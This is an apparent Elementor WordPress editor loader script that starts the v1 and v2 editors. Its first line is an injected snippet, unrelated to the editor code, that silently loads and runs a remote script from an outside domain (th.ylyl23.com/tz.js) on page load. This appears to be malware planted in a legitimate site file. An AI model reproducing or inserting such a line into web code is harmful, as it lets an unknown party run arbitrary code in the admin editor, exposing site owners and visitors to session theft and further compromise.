(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
window.__elementorEditorV1LoadingPromise = new Promise( ( resolve ) => {
	window.addEventListener( 'elementor/init', () => {
		resolve();
	}, { once: true } );
} );

window.elementor.start();

if ( ! window.elementorV2?.editor ) {
	throw new Error( 'The "@elementor/editor" package was not loaded.' );
}

window.elementorV2
	.editor
	.start(
		document.getElementById( 'elementor-editor-wrapper-v2' ),
	);
